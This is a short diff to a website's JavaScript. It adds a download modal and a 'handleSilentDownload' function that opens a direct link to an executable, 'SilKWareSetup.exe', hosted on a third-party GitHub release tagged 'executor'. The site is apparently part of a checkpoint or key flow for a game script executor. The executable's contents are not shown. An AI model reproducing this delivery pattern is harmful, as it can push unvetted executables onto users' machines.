@@ -57,6 +57,16 @@ function goToCheckpoint() {
     window.location.href = '/checkpoint-1';
 }
 
+function openDownloadModal() {
+    document.getElementById('download-modal').classList.add('active');
+}
+
+function handleSilentDownload() {
+    window.open('https://github.com/shadowdih20-cloud/SetupSilkWareDownload/releases/download/executor/SilKWareSetup.exe', '_blank');
+    document.getElementById('download-modal').classList.remove('active');
+    document.getElementById('thank-you-modal').classList.add('active');
+}
+
 function showAbout() {
     document.getElementById('about-modal').classList.add('active');
 }
